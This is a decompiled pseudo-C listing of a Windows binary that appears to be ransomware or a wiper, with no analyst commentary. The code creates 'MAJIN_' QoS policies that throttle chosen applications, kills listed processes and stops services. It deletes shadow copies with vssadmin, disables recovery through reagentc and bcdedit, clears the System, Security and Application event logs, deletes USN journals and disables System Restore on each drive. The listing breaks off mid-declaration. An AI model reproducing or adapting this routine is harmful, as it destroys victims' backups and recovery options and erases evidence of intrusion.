  QueryInterface = pProxy->lpVtbl[2].QueryInterface;
  v3 = qword_1400187D0(L"MSFT_NetQosPolicySettingData");
  v4 = v3;
  v5 = SysAllocStringLen(nullptr, v3);
  v6 = v5;
  if ( v5 != nullptr )
    sub_14000A820(v5, L"MSFT_NetQosPolicySettingData", 2 * v4);
  if ( ((int (__fastcall *)(IUnknown *, BSTR, _QWORD, _QWORD, __int64 *, _QWORD))QueryInterface)(
         pProxy,
         v6,
         0,
         0,
         &v61,
         0) < 0 )
    return 4294967294LL;
  v60 = nullptr;
  v8 = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64 **))(*(_QWORD *)v61 + 120LL))(v61, 0, &v60);
  (*(void (__fastcall **)(__int64))(*(_QWORD *)v61 + 16LL))(v61);
  if ( v8 < 0 )
    return 4294967293LL;
  v9 = _InterlockedIncrement(&dword_140018D24);
  qword_1400187B8(String2, L"MAJIN_");
  v10 = qword_1400187D0(String2);
  String2[v10] = a0123456789abcd[(unsigned __int64)v9 >> 12];
  String2[v10 + 1] = a0123456789abcd[((unsigned __int64)v9 >> 8) & 0xF];
  v11 = v10 + 2;
  String2[v11] = a0123456789abcd[((unsigned __int64)v9 >> 4) & 0xF];
  String2[v11 + 1] = a0123456789abcd[v9 & 0xF];
  String2[v10 + 4] = 0;
  CoCreateGuid((GUID *)&pguid);
  LODWORD(v53) = pguid.bVal;
  LODWORD(v52) = pguid.wReserved3;
  wsprintfW(
    v56,
    L"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
    *(unsigned int *)&pguid.vt,
    pguid.wReserved2,
    v52,
    v53,
    BYTE1(pguid.decVal.Lo32),
    BYTE2(pguid.decVal.Lo64),
    BYTE3(pguid.decVal.Lo64),
    BYTE4(pguid.decVal.Lo64),
    BYTE5(pguid.decVal.Lo64),
    BYTE6(pguid.decVal.Lo64),
    HIBYTE(pguid.decVal.Lo64));
  qword_1400187B8(String1, v56);
  lstrcatW(String1, L"\\");
  lstrcatW(String1, String2);
  lstrcatW(String1, L"\\ActiveStore");
  v12 = v60;
  VariantInit(&pguid);
  pguid.vt = 8;
  v13 = qword_1400187D0(String2);
  v14 = v13;
  v15 = SysAllocStringLen(nullptr, v13);
  v16 = (LONGLONG)v15;
  if ( v15 != nullptr )
    sub_14000A820(v15, String2, 2 * v14);
  v17 = *v12;
  pguid.llVal = v16;
  (*(void (__fastcall **)(__int64 *, const wchar_t *, _QWORD, VARIANTARG *, _DWORD))(v17 + 40))(
    v12,
    L"Name",
    0,
    &pguid,
    0);
  VariantClear(&pguid);
  v18 = v60;
  VariantInit(&pguid);
  pguid.vt = 8;
  v19 = qword_1400187D0(String1);
  v20 = v19;
  v21 = SysAllocStringLen(nullptr, v19);
  v22 = (LONGLONG)v21;
  if ( v21 != nullptr )
    sub_14000A820(v21, String1, 2 * v20);
  v23 = *v18;
  pguid.llVal = v22;
  (*(void (__fastcall **)(__int64 *, const wchar_t *, _QWORD, VARIANTARG *, _DWORD))(v23 + 40))(
    v18,
    L"InstanceID",
    0,
    &pguid,
    0);
  VariantClear(&pguid);
  v24 = v60;
  VariantInit(&pguid);
  pguid.vt = 8;
  v25 = qword_1400187D0(v58);
  v26 = v25;
  v27 = SysAllocStringLen(nullptr, v25);
  v28 = (LONGLONG)v27;
  if ( v27 != nullptr )
    sub_14000A820(v27, v58, 2 * v26);
  v29 = *v24;
  pguid.llVal = v28;
  (*(void (__fastcall **)(__int64 *, const wchar_t *, _QWORD, VARIANTARG *, _DWORD))(v29 + 40))(
    v24,
    L"AppPathNameMatchCondition",
    0,
    &pguid,
    0);
  VariantClear(&pguid);
  v30 = v60;
  VariantInit(&pguid);
  pguid.vt = 8;
  v31 = qword_1400187D0(L"8");
  v32 = v31;
  v33 = SysAllocStringLen(nullptr, v31);
  v34 = (LONGLONG)v33;
  if ( v33 != nullptr )
    sub_14000A820(v33, L"8", 2 * v32);
  v35 = *v30;
  pguid.llVal = v34;
  (*(void (__fastcall **)(__int64 *, const wchar_t *, _QWORD, VARIANTARG *, _DWORD))(v35 + 40))(
    v30,
    L"ThrottleRateAction",
    0,
    &pguid,
    0);
  VariantClear(&pguid);
  v36 = v60;
  v59 = 3;
  VariantInit(&pguid);
  pguid.vt = 19;
  sub_14000A820(&pguid.decVal.8, &v59, 4u);
  (*(void (__fastcall **)(__int64 *, const wchar_t *, _QWORD, VARIANTARG *, _DWORD))(*v36 + 40))(
    v36,
    L"IPProtocolMatchCondition",
    0,
    &pguid,
    0);
  VariantClear(&pguid);
  v37 = v60;
  v59 = 0;
  VariantInit(&pguid);
  pguid.vt = 19;
  sub_14000A820(&pguid.decVal.8, &v59, 4u);
  (*(void (__fastcall **)(__int64 *, const wchar_t *, _QWORD, VARIANTARG *, _DWORD))(*v37 + 40))(
    v37,
    L"NetworkProfile",
    0,
    &pguid,
    0);
  VariantClear(&pguid);
  v38 = v60;
  v59 = 1;
  VariantInit(&pguid);
  pguid.vt = 19;
  sub_14000A820(&pguid.decVal.8, &v59, 4u);
  (*(void (__fastcall **)(__int64 *, const wchar_t *, _QWORD, VARIANTARG *, _DWORD))(*v38 + 40))(
    v38,
    L"Owner",
    0,
    &pguid,
    0);
  VariantClear(&pguid);
  v39 = sub_14000B720();
  v40 = ((__int64 (__fastcall *)(IUnknown *, __int64 *, __int64, LPVOID, _QWORD))pProxy->lpVtbl[4].Release)(
          pProxy,
          v60,
          2,
          v39,
          0);
  (*(void (__fastcall **)(__int64 *))(*v60 + 16))(v60);
  if ( v39 != nullptr )
    (*(void (__fastcall **)(LPVOID))(*(_QWORD *)v39 + 16LL))(v39);
  if ( v40 < 0 )
  {
    sub_14000B6B0((__int64)"[qos] PutInstance FAIL: ");
    v41 = 0;
    p_pguid = &pguid;
    do
    {
      v43 = v41;
      v44 = v40 & 0xF;
      p_pguid = (VARIANTARG *)((char *)p_pguid + 1);
      v45 = 48;
      if ( v44 >= 0xA )
        v45 = 55;
      ++v41;
      v40 = (unsigned int)v40 >> 4;
      *((_BYTE *)&p_pguid[-1].decVal + 23) = v44 + v45;
    }
    while ( v40 != 0 );
    v46 = v43;
    if ( (int)v43 > 0 )
    {
      v47 = 0;
      do
      {
        v48 = *((_BYTE *)&pguid.vt + v47);
        *((_BYTE *)&pguid.vt + v47++) = *((_BYTE *)&pguid.vt + v46);
        *((_BYTE *)&pguid.vt + v46--) = v48;
      }
      while ( v47 < v46 );
    }
    *((_BYTE *)&pguid.vt + v41) = 0;
    v49 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v49 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v50 = (void (__fastcall *)(__int64, VARIANTARG *, _QWORD, int *, _QWORD))qword_140018880;
      v51 = qword_1400187C8(&pguid);
      v50(v49, &pguid, v51, &v59, 0);
    }
    sub_14000B6B0((__int64)"\r\n");
    return 4294967292LL;
  }
  else
  {
    sub_14000B6B0((__int64)"[qos] blocked: ");
    sub_14000B6B0(a1);
    sub_14000B6B0((__int64)"\r\n");
    return 0;
  }
}


// ----- sub_14000C1B0 @ 0x14000c1b0 -----
__int64 sub_14000C1B0()
{
  LPVOID v0; // rdi
  ULONG (__stdcall *Release)(IUnknown *); // r15
  signed int v2; // eax
  __int64 v3; // rbx
  BSTR v4; // rax
  BSTR v5; // rsi
  signed int v6; // eax
  __int64 v7; // r14
  BSTR v8; // rax
  BSTR v9; // rbx
  unsigned int i; // ebx
  const wchar_t *v12; // rax
  __int16 v13; // dx
  VARIANTARG v14; // [rsp+38h] [rbp-9h] BYREF
  VARIANTARG pvarg; // [rsp+50h] [rbp+Fh] BYREF
  int v16; // [rsp+A8h] [rbp+67h] BYREF
  __int64 v17; // [rsp+B0h] [rbp+6Fh] BYREF
  __int64 v18; // [rsp+B8h] [rbp+77h] BYREF

  if ( pProxy == nullptr || dword_140018D20 == 0 )
    return 0xFFFFFFFFLL;
  v0 = sub_14000B720();
  v18 = 0;
  Release = pProxy->lpVtbl[6].Release;
  v2 = qword_1400187D0(L"SELECT * FROM MSFT_NetQosPolicySettingData");
  v3 = v2;
  v4 = SysAllocStringLen(nullptr, v2);
  v5 = v4;
  if ( v4 != nullptr )
    sub_14000A820(v4, L"SELECT * FROM MSFT_NetQosPolicySettingData", 2 * v3);
  v6 = qword_1400187D0(L"WQL");
  v7 = v6;
  v8 = SysAllocStringLen(nullptr, v6);
  v9 = v8;
  if ( v8 != nullptr )
    sub_14000A820(v8, L"WQL", 2 * v7);
  if ( ((int (__fastcall *)(IUnknown *, BSTR, BSTR, __int64, LPVOID, __int64 *))Release)(pProxy, v9, v5, 48, v0, &v18) >= 0 )
  {
    v17 = 0;
    v16 = 0;
    for ( i = 0;
          (*(int (__fastcall **)(__int64, __int64, __int64, __int64 *, int *))(*(_QWORD *)v18 + 32LL))(
            v18,
            0xFFFFFFFFLL,
            1,
            &v17,
            &v16) >= 0;
          v16 = 0 )
    {
      if ( v16 == 0 )
        break;
      VariantInit(&pvarg);
      (*(void (__fastcall **)(__int64, const wchar_t *, _QWORD, VARIANTARG *, _QWORD, _QWORD))(*(_QWORD *)v17 + 32LL))(
        v17,
        L"Name",
        0,
        &pvarg,
        0,
        0);
      if ( pvarg.llVal != 0 )
      {
        v12 = L"MAJIN_";
        do
        {
          v13 = *(const wchar_t *)((char *)v12 + pvarg.llVal - (_QWORD)L"MAJIN_");
          if ( v13 == 0 )
            break;
          if ( *v12 != v13 && (*v12 ^ 0x20) != v13 )
            goto LABEL_22;
          ++v12;
        }
        while ( *v12 != 0 );
        if ( *v12 == 0 )
        {
          VariantInit(&v14);
          if ( (*(int (__fastcall **)(__int64, const wchar_t *, _QWORD, VARIANTARG *, _QWORD, _QWORD))(*(_QWORD *)v17 + 32LL))(
                 v17,
                 L"__PATH",
                 0,
                 &v14,
                 0,
                 0) >= 0 )
          {
            ((void (__fastcall *)(IUnknown *, LONGLONG, _QWORD, LPVOID, _QWORD))pProxy->lpVtbl[5].AddRef)(
              pProxy,
              v14.llVal,
              0,
              v0,
              0);
            ++i;
            VariantClear(&v14);
          }
        }
      }
LABEL_22:
      VariantClear(&pvarg);
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v17 + 16LL))(v17);
      v17 = 0;
    }
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v18 + 16LL))(v18);
    if ( v0 != nullptr )
      (*(void (__fastcall **)(LPVOID))(*(_QWORD *)v0 + 16LL))(v0);
    return i;
  }
  else
  {
    if ( v0 != nullptr )
      (*(void (__fastcall **)(LPVOID))(*(_QWORD *)v0 + 16LL))(v0);
    return 4294967294LL;
  }
}


// ----- sub_14000C480 @ 0x14000c480 -----
__int64 sub_14000C480()
{
  int v0; // ebx
  unsigned int (__fastcall *v1)(HANDLE, __int64, __int64 *); // rdi
  HANDLE CurrentProcess; // rax
  __int64 v3; // rdx
  const char *v4; // rcx
  int v6; // [rsp+80h] [rbp+8h] BYREF
  _BYTE v7[6]; // [rsp+88h] [rbp+10h] BYREF
  __int64 v8; // [rsp+90h] [rbp+18h] BYREF
  __int64 v9; // [rsp+98h] [rbp+20h] BYREF

  v0 = 0;
  *(_DWORD *)v7 = 0;
  v8 = 0;
  v6 = 0;
  *(_WORD *)&v7[4] = 1280;
  memset(FileName, 0, 0x104u);
  v1 = (unsigned int (__fastcall *)(HANDLE, __int64, __int64 *))qword_140018940;
  dword_140018D38 = 0;
  dword_140018D30 = 0;
  CurrentProcess = GetCurrentProcess();
  if ( v1(CurrentProcess, 8, &v9) != 0 )
  {
    LOBYTE(v3) = 2;
    qword_140018950(v7, v3, 32, 544, 0, 0, 0, 0, 0, 0, &v8);
    if ( v8 != 0 )
    {
      qword_140018958(0, v8, &v6);
      qword_140018960(v8);
    }
    qword_140018640(v9);
    LOBYTE(v0) = v6 != 0;
    dword_140018D30 = v0;
  }
  else
  {
    v0 = dword_140018D30;
  }
  v4 = "[pf] init: user\r\n";
  if ( v0 != 0 )
    v4 = "[pf] init: admin\r\n";
  sub_14000E080(v4);
  return 0;
}


// ----- sub_14000C5A0 @ 0x14000c5a0 -----
__int64 sub_14000C5A0()
{
  __int64 v0; // rdi
  void (__fastcall *v1)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v2; // eax
  __int64 v3; // rdi
  void (__fastcall *v4)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v5; // eax
  char v7; // [rsp+40h] [rbp+8h] BYREF

  if ( dword_140018D34 != 0 )
  {
    v0 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v0 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v1 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v2 = qword_1400187C8("[pf] preflight start\r\n");
      v1(v0, "[pf] preflight start\r\n", v2, &v7, 0);
    }
  }
  sub_14000C7D0();
  sub_14000CB40();
  sub_14000CD40();
  if ( dword_140018D34 != 0 )
  {
    v3 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v3 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v4 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v5 = qword_1400187C8("[pf] preflight done\r\n");
      v4(v3, "[pf] preflight done\r\n", v5, &v7, 0);
    }
  }
  return 0;
}


// ----- sub_14000C680 @ 0x14000c680 -----
__int64 sub_14000C680()
{
  __int64 v0; // rdi
  void (__fastcall *v1)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v2; // eax
  __int64 v3; // rdi
  void (__fastcall *v4)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v5; // eax
  char v7; // [rsp+40h] [rbp+8h] BYREF

  if ( dword_140018D34 != 0 )
  {
    v0 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v0 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v1 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v2 = qword_1400187C8("[pf] postflight start\r\n");
      v1(v0, "[pf] postflight start\r\n", v2, &v7, 0);
    }
  }
  sub_14000D1F0();
  if ( dword_140018D34 != 0 )
  {
    v3 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v3 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v4 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v5 = qword_1400187C8("[pf] postflight done\r\n");
      v4(v3, "[pf] postflight done\r\n", v5, &v7, 0);
    }
  }
  return 0;
}


// ----- sub_14000C750 @ 0x14000c750 -----
void sub_14000C750()
{
  __int64 v0; // rdi
  void (__fastcall *v1)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v2; // eax
  char v3; // [rsp+40h] [rbp+8h] BYREF

  if ( dword_140018D34 != 0 )
  {
    v0 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v0 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v1 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v2 = qword_1400187C8("[pf] done: cleanup\r\n");
      v1(v0, "[pf] done: cleanup\r\n", v2, &v3, 0);
    }
  }
}


// ----- sub_14000C7D0 @ 0x14000c7d0 -----
void sub_14000C7D0()
{
  unsigned int v0; // ebp
  __int64 v1; // rsi
  void (__fastcall *v2)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v3; // eax
  __int64 v4; // rsi
  unsigned int v5; // edi
  LPCWSTR *v6; // rbx
  void *v7; // rax
  void *v8; // rdi
  BOOL v9; // eax
  unsigned int v10; // ecx
  __int64 v11; // rsi
  void (__fastcall *v12)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v13; // eax
  __int64 v14; // rsi
  void (__fastcall *v15)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v16; // eax
  _DWORD v17[150]; // [rsp+30h] [rbp-258h] BYREF
  char v18; // [rsp+290h] [rbp+8h] BYREF

  v0 = 0;
  if ( dword_140018D30 != 0 )
  {
    v4 = qword_140018BC0(2, 0);
    if ( v4 == -1 )
    {
      sub_14000E080("[pf] CreateToolhelp32Snapshot failed\r\n");
    }
    else
    {
      memset(v17, 0, 0x238u);
      v17[0] = 568;
      if ( (unsigned int)qword_140018BC8(v4, v17) != 0 )
      {
        do
        {
          v5 = 0;
          v6 = (LPCWSTR *)off_140017420;
          while ( lstrcmpiW((LPCWSTR)&v17[11], *v6) != 0 )
          {
            ++v5;
            ++v6;
            if ( v5 >= 0x1B )
              goto LABEL_16;
          }
          v7 = (void *)qword_140018BD8(1, 0, v17[2]);
          v8 = v7;
          if ( v7 != nullptr )
          {
            v9 = TerminateProcess(v7, 0);
            v10 = v0 + 1;
            if ( !v9 )
              v10 = v0;
            v0 = v10;
            qword_140018640(v8);
          }
LABEL_16:
          ;
        }
        while ( (unsigned int)qword_140018BD0(v4, v17) != 0 );
      }
      qword_1400186A0(v4);
      if ( dword_140018D34 != 0 )
      {
        v11 = qword_140018750(4294967284LL);
        if ( (unsigned __int64)(v11 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        {
          v12 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
          v13 = qword_1400187C8("[pf] processes killed: ");
          v12(v11, "[pf] processes killed: ", v13, &v18, 0);
        }
      }
      sub_14000E100(v0);
      if ( dword_140018D34 != 0 )
      {
        v14 = qword_140018750(4294967284LL);
        if ( (unsigned __int64)(v14 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        {
          v15 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
          v16 = qword_1400187C8("\r\n");
          v15(v14, "\r\n", v16, &v18, 0);
        }
      }
    }
  }
  else if ( dword_140018D34 != 0 )
  {
    v1 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v1 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v2 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v3 = qword_1400187C8("[pf] kill skipped (not admin)\r\n");
      v2(v1, "[pf] kill skipped (not admin)\r\n", v3, &v18, 0);
    }
  }
}


// ----- sub_14000CA00 @ 0x14000ca00 -----
__int64 __fastcall sub_14000CA00(const void *a1, const void *a2, unsigned int a3)
{
  unsigned __int64 v6; // r14
  int v7; // r15d
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+50h] [rbp-2A8h] BYREF
  struct _STARTUPINFOA StartupInfo; // [rsp+70h] [rbp-288h] BYREF
  CHAR CommandLine[512]; // [rsp+E0h] [rbp-218h] BYREF

  v6 = (int)qword_1400187C8(a1);
  v7 = qword_1400187C8(a2);
  if ( (int)v6 + v7 + 1 >= 512 )
    return 0;
  sub_14000A820(CommandLine, a1, v6);
  CommandLine[v6] = 32;
  sub_14000A820(&CommandLine[v6 + 1], a2, v7 + 1);
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 104;
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  if ( !CreateProcessA(
          nullptr,
          CommandLine,
          nullptr,
          nullptr,
          false,
          0x8000000u,
          nullptr,
          nullptr,
          &StartupInfo,
          &ProcessInformation) )
    return 0;
  qword_140018870(ProcessInformation.hProcess, a3);
  qword_140018640(ProcessInformation.hProcess);
  qword_140018640(ProcessInformation.hThread);
  return 1;
}


// ----- sub_14000CB40 @ 0x14000cb40 -----
void sub_14000CB40()
{
  unsigned int v0; // ebp
  __int64 v1; // rdi
  void (__fastcall *v2)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v3; // eax
  __int64 v4; // r14
  char **v5; // rbx
  __int64 i; // rdi
  __int64 v7; // rax
  __int64 v8; // rsi
  int v9; // eax
  unsigned int v10; // ecx
  __int64 v11; // rdi
  void (__fastcall *v12)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v13; // eax
  __int64 v14; // rdi
  void (__fastcall *v15)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v16; // eax
  _BYTE v17[56]; // [rsp+30h] [rbp-38h] BYREF
  char v18; // [rsp+70h] [rbp+8h] BYREF

  v0 = 0;
  if ( dword_140018D30 != 0 )
  {
    v4 = qword_1400188F8(0, 0, 1);
    if ( v4 != 0 )
    {
      v5 = off_140017500;
      for ( i = 35; i != 0; --i )
      {
        v7 = qword_140018900(v4, *v5, 36);
        v8 = v7;
        if ( v7 != 0 )
        {
          v9 = qword_140018918(v7, 1, v17);
          v10 = v0 + 1;
          if ( v9 == 0 )
            v10 = v0;
          v0 = v10;
          qword_1400188E8(v8);
        }
        ++v5;
      }
      qword_1400188E8(v4);
      if ( dword_140018D34 != 0 )
      {
        v11 = qword_140018750(4294967284LL);
        if ( (unsigned __int64)(v11 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        {
          v12 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
          v13 = qword_1400187C8("[pf] services stopped: ");
          v12(v11, "[pf] services stopped: ", v13, &v18, 0);
        }
      }
      sub_14000E100(v0);
      if ( dword_140018D34 != 0 )
      {
        v14 = qword_140018750(4294967284LL);
        if ( (unsigned __int64)(v14 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        {
          v15 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
          v16 = qword_1400187C8("\r\n");
          v15(v14, "\r\n", v16, &v18, 0);
        }
      }
    }
    else
    {
      sub_14000E080("[pf] OpenSCManager failed\r\n");
    }
  }
  else if ( dword_140018D34 != 0 )
  {
    v1 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v1 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v2 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v3 = qword_1400187C8("[pf] services skipped (not admin)\r\n");
      v2(v1, "[pf] services skipped (not admin)\r\n", v3, &v18, 0);
    }
  }
}


// ----- sub_14000CD40 @ 0x14000cd40 -----
void sub_14000CD40()
{
  __int64 v0; // r14
  void (__fastcall *v1)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v2; // eax
  __int64 v3; // r14
  void (__fastcall *v4)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v5; // eax
  __int64 v6; // r14
  void (__fastcall *v7)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v8; // eax
  _BYTE *i; // rdi
  __int64 v10; // r14
  void (__fastcall *v11)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v12; // eax
  _BYTE v13[64]; // [rsp+50h] [rbp-B0h] BYREF
  _BYTE v14[544]; // [rsp+90h] [rbp-70h] BYREF
  int v15; // [rsp+2C0h] [rbp+1C0h] BYREF
  __int64 v16; // [rsp+2C8h] [rbp+1C8h] BYREF
  __int64 v17; // [rsp+2D0h] [rbp+1D0h] BYREF

  if ( dword_140018D30 != 0 )
  {
    if ( (unsigned int)qword_140018980(
                         -2147483646,
                         "SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",
                         0,
                         0,
                         0,
                         131078,
                         0,
                         &v17,
                         0) == 0 )
    {
      v15 = 0xFFFF;
      qword_1400189A0(v17, "MaxMpxCt", 0, 4, &v15, 4);
      LODWORD(v16) = 3;
      qword_1400189A0(v17, "Size", 0, 4, &v16, 4);
      qword_140018978(v17);
      sub_14000E080("[pf] LanmanServer registry set\r\n");
    }
    if ( (unsigned int)qword_140018980(
                         -2147483646,
                         "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management",
                         0,
                         0,
                         0,
                         131078,
                         0,
                         &v16,
                         0) == 0 )
    {
      v15 = 1;
      qword_1400189A0(v16, "DisablePagingExecutive", 0, 4, &v15, 4);
      qword_1400189A0(v16, "LargeSystemCache", 0, 4, &v15, 4);
      qword_140018978(v16);
      sub_14000E080("[pf] Memory Management registry set\r\n");
    }
    sub_14000CA00("vssadmin.exe", "delete shadows /all /quiet", 0x7530u);
    if ( dword_140018D34 != 0 )
    {
      v3 = qword_140018750(4294967284LL);
      if ( (unsigned __int64)(v3 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v4 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v5 = qword_1400187C8("[pf] vssadmin executed\r\n");
        v4(v3, "[pf] vssadmin executed\r\n", v5, &v15, 0);
      }
    }
    sub_14000CA00("reagentc.exe", "/disable", 0x2710u);
    sub_14000CA00("bcdedit.exe", "/set {default} recoveryenabled no", 0x2710u);
    sub_14000CA00("bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures", 0x2710u);
    sub_14000CA00("powercfg.exe", "/hibernate off", 0x2710u);
    sub_14000CA00("wevtutil.exe", "cl System", 0x2710u);
    sub_14000CA00("wevtutil.exe", "cl Security", 0x2710u);
    sub_14000CA00("wevtutil.exe", "cl Application", 0x2710u);
    if ( dword_140018D34 != 0 )
    {
      v6 = qword_140018750(4294967284LL);
      if ( (unsigned __int64)(v6 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v7 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v8 = qword_1400187C8("[pf] event logs cleared\r\n");
        v7(v6, "[pf] event logs cleared\r\n", v8, &v15, 0);
      }
    }
    memset(v14, 0, 0x200u);
    if ( (unsigned int)qword_140018718(511, v14) - 1 <= 0x1FE )
    {
      for ( i = v14; *i != 0; i += (int)qword_1400187C8(i) + 1 )
      {
        if ( (unsigned int)qword_1400186D0(i) == 3 )
        {
          qword_140018B50(v13, "usn deletejournal /d %c:", (unsigned int)(char)*i);
          sub_14000CA00("fsutil.exe", v13, 0x2710u);
          qword_140018B50(
            v13,
            "/namespace:\\\\root\\default path SystemRestore call Disable \"%c:\\\"",
            (unsigned int)(char)*i);
          sub_14000CA00("wmic.exe", v13, 0x3A98u);
        }
      }
    }
    if ( dword_140018D34 != 0 )
    {
      v10 = qword_140018750(4294967284LL);
      if ( (unsigned __int64)(v10 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v11 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v12 = qword_1400187C8("[pf] per-drive cleanup done\r\n");
        v11(v10, "[pf] per-drive cleanup done\r\n", v12, &v15, 0);
      }
    }
  }
  else if ( dword_140018D34 != 0 )
  {
    v0 = qword_140018750(4294967284LL);
    if ( (unsigned __int64)(v0 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v1 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v2 = qword_1400187C8("[pf] system tweaks skipped (not admin)\r\n");
      v1(v0, "[pf] system tweaks skipped (not admin)\r\n", v2, &v15, 0);
    }
  }
}


// ----- sub_14000D1F0 @ 0x14000d1f0 -----
char *sub_14000D1F0()
{
  char *v0; // rsi
  __int64 v1; // r15
  HDC v2; // r12
  __int64 v3; // r13
  const char *v4; // rdx
  unsigned int v5; // ebx
  __int64 v6; // rbx
  void (__fastcall *v7)(__int64, const char *, _QWORD, __int64 *, _QWORD); // rdi
  unsigned int v8; // eax
  __int64 v9; // rdx
  __int64 v10; // rcx
  __int64 v11; // rdi
  char *result; // rax
  __int64 v13; // rdx
  char *v14; // rcx
  __int64 v15; // rax
  __int64 v16; // rdi
  __int64 v17; // rdi
  HDC v18; // rbx
  __int64 v19; // rsi
  __int64 v20; // rax
  __int64 v21; // rdi
  __int64 v22; // rcx
  int v23; // eax
  __int64 v24; // rdx
  int v25; // r13d
  int ySrc; // esi
  __int64 (__fastcall *v27)(__int64, _QWORD, __int64); // rdi
  __int64 v28; // rbx
  __int64 v29; // rax
  __int64 v30; // rdx
  __int64 v31; // r15
  int v32; // edi
  HDC v33; // r12
  __int64 v34; // r14
  _BYTE *v35; // rax
  void (__fastcall *v36)(__int64, _QWORD, __int64); // rdi
  __int64 v37; // rax
  HDC v38; // rdi
  __int64 v39; // rdi
  HDC v40; // r15
  __int64 v41; // rbx
  __int64 v42; // rax
  __int64 v43; // rdi
  __int64 v44; // rax
  __int64 v45; // r13
  int wSrc; // r9d
  int hSrc; // r8d
  void (__fastcall *v48)(HDC, const char *, _QWORD, __int64 *); // rdi
  unsigned int v49; // eax
  int hDest; // ebx
  int v51; // edi
  int v52; // esi
  __int64 v53; // rbx
  __int64 v54; // rax
  __int64 v55; // rdi
  __int64 (__fastcall *v56)(__int64, _QWORD, __int64); // rdi
  __int64 v57; // rax
  __int64 v58; // rax
  __int64 v59; // rdi
  void (__fastcall *v60)(__int64, const char *, _QWORD, __int64, CHAR *, int); // rdi
  int v61; // eax
  void (__fastcall *v62)(__int64, const char *, _QWORD, __int64, CHAR *, int); // rdi
  int v63; // eax
  __int64 v64; // rdx
  void (__fastcall *v65)(__int64, const char *, _QWORD, __int64, CHAR *, int); // rdi
  int v66; // eax
  char *v67; // r14
  __int64 (__fastcall *v68)(char *, const char *, _QWORD, __int64 *, _QWORD); // rbx
  unsigned int v69; // eax
  __int64 (__fastcall *v70)(__int64, _QWORD, char *); // rdi
  __int64 v71; // rax
  __int128 v72; // [rsp+60h] [rbp-A0h] BYREF
  __m128i si128; // [rsp+70h] [rbp-90h] BYREF
  __int64 v74; // [rsp+80h] [rbp-80h] BYREF
  __int64 v75; // [rsp+88h] [rbp-78h]
  __int64 v76; // [rsp+90h] [rbp-70h]
  _DWORD FileInformation[10]; // [rsp+98h] [rbp-68h] BYREF
  HDC v78; // [rsp+C0h] [rbp-40h] BYREF
